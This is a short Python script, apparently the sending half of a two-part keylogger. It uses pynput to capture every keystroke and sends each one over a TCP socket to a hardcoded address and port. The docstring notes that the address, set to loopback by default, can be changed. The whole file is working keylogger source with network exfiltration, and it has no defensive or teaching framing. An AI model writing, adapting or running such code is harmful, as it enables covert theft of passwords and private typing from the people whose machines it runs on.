from pynput.keyboard import Key, Listener
from socket import *

"""
Sends typed keys to a specified IP address on a specified port.
This script is the second part of a two part program, log_listener being the first.
The IP is hardcoded to loopback but can be changed.
The default settings will run locally.
"""

class Client(object):

	@staticmethod
	def on_press(key):
		with socket(AF_INET, SOCK_STREAM) as s:
			if s.connect_ex(('127.0.0.1', 5432)):
				pass
			else:
				s.sendall(str(key).encode())

def main():
	with Listener(on_press=Client.on_press) as l:
		l.join()

if __name__ == '__main__':
	main()
